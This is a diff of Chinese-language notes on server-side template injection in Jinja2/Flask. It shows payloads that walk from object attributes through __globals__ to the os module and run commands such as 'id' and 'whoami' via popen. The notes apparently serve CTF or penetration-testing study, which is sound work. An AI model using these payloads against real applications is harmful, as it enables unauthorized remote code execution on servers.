@@ -3,22 +3,29 @@
 
 ### 元素是带有函数的对象时:
 ##### 所有对象基本都有构造函数,在不知道有哪些对象时,使用config,"",(),[],他们字面量也属于对象
-__init__:拿出构造函数对象object
+#### __init__:拿出构造函数对象object
 
 ```
 ().__class__.__init__
 ```
-##### __globals__:对象模块的全局字典,包含os等主要模块
+#### 或者直接使用`url_for`、`get_flashed_messages`、lipsum这些自带函数对象
+
+```
+url_for.__globals__['os'].popen('id').read()
+```
+
+#### globals__:对象模块的全局字典,包含os等主要模块
+
 ```
 ().__class__.__init__.__globals__
 ```
-##### 掏出全局字典的os
+#### 掏出全局字典的os
 ```
 ().__class__.__init__.__globals__['os']
 ```
 
 
-##### 拿到os模块后开始执行命令
+#### 拿到os模块后开始执行命令
 ```
 os=().__class__.__init__.__globals__['os']
 os.popen('whoami').read()    # 执行命令，读回输出
